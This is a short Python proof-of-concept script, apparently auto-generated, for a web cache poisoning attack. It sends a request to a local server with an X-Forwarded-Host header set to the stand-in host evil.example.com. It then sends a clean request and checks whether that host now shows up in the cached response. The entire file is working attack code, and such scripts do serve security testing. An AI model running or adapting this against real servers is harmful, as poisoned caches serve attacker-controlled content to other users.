#!/usr/bin/env python3
"""PoC: Confuse cache key with header - Auto-generated"""
import requests

URL = "http://localhost:6000"
HEADERS = {
    "X-Forwarded-Host": "evil.example.com",
}

r = requests.get(URL, headers=HEADERS, timeout=10)
print("Poison response:", r.status_code)

r2 = requests.get(URL, timeout=10)
print("")
print("Clean request response:")
print(f"  Status: {r2.status_code}")
if "evil.example.com" in r2.text:
    print("[!] CACHE POISONED")
else:
    print("[+] Cache not poisoned")
